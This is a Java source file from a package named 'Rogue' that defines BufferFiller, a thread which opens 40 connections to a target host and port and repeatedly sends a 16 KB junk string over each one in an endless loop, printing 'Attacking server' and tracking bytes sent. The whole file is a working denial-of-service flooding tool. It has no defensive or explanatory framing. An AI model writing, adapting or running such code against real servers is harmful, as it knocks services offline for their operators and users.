package Rogue;

public class BufferFiller extends Thread{
	private String server;
	private int port;
	private Connection[] con;
	private String data;
	private long dataLen;
	private long dataSent;
	private long timeStarted;
	public BufferFiller(String host, int destPort) {
		server = host;
		port = destPort;
		dataSent = 0;
		con = new Connection[40];
		data = "$";
		for (int i = 0; i != 40; ++i) {
			con[i] = new Connection(server, port, true);
		}
		for (int i = 0; i != 14; ++i) {
			data += data;
		}
		dataLen = data.length();
		System.out.println("Attacking server " + host + ":" + destPort + " with packetlen of " + dataLen);
	}
	
	public long getDataSent() {
		return dataSent;
	}
	
	public long getRunTime() {
		return System.currentTimeMillis() - timeStarted;
	}
	
	public double getMbips() {
		return getDataSent()/1000/getRunTime();
	}
	
	public void run() {
		timeStarted = System.currentTimeMillis();
		while (true) {
			for (int i = 0; i != 40; ++i) {
				con[i].sendData(data);
				dataSent += dataLen;
			}
			try {
				Thread.sleep(10);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
}
